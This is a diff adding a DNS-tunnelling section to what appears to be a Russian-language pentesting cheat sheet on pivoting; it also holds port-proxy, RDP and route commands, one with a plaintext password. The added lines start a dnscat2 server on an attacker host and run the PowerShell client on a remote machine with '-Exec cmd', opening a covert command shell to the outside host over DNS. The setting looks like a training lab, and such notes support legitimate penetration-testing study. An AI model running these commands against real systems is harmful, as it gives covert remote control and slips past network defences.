@@ -472,6 +472,20 @@ route add 10.10.10.0/23 mask 255.255.254.0 192.168.50.123
 		netsh.exe interface portproxy show v4tov4
 		xfreerdp /v:10.129.47.201:8080 /u:victor /p:pass@123
 
+# DNS-туннелирование с помощью Dnscat2
+		у себя
+		git clone https://github.com/iagox86/dnscat2.git
+		cd dnscat2/server/
+		sudo gem install bundler
+		sudo bundle install
+		sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+
+		на удаленной машине
+		git clone https://github.com/lukebaggett/dnscat2-powershell.git
+		Import-Module .\dnscat2.ps1
+		Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+		window -i 1
+		
 # Смена таблици маршрутицации 
 
 	sudo ip route add 192.168.134.0/24 via 10.200.100.6
